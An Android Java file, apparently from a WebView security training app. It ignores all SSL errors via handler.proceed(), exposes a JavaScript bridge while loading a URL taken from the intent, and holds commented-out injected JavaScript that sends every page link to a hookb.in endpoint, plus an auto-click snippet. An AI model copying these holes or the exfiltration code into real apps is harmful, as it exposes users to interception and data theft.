package com.training.webviews;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.net.http.SslError;
import android.os.Bundle;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        WebView myWebView = (WebView) findViewById(R.id.myWebView);

        WebSettings webSettings = myWebView.getSettings();
        //webSettings.setDomStorageEnabled(true);
        myWebView.addJavascriptInterface(new MyJavaScriptInterface(this),"AndroidBridge");

//        myWebView.setVisibility(myWebView.GONE);
        webSettings.setJavaScriptEnabled(true);
        myWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                System.out.println("finished");
//                    view.setWebChromeClient(new WebChromeClient());
//                    view.loadUrl("javascript: " +
//                                    "var ahrefs = document.getElementsByTagName(\"a\");" +
//                                    "var exfiltrate=new XMLHttpRequest();"+
//                                    "exfiltrate.open(\"POST\", 'https://hookb.in/XkKEXqJZXzhDYMQQYVyQ', false);"+
//                                    "for (var i = 0; i < ahrefs.length; i++) {" +
//                                        "exfiltrate.send(ahrefs[i].href);" +
//                                        "console.log(ahrefs[i].href);}");



                        //-------Auto Click
//                    view.loadUrl("javascript:var elements = " +
//                            "document.getElementsByTagName('button'); " +
//                            "elements[0].click();");
            }
        });

        Intent intent = getIntent();

        myWebView.loadUrl(intent.getStringExtra("url"));

    }
}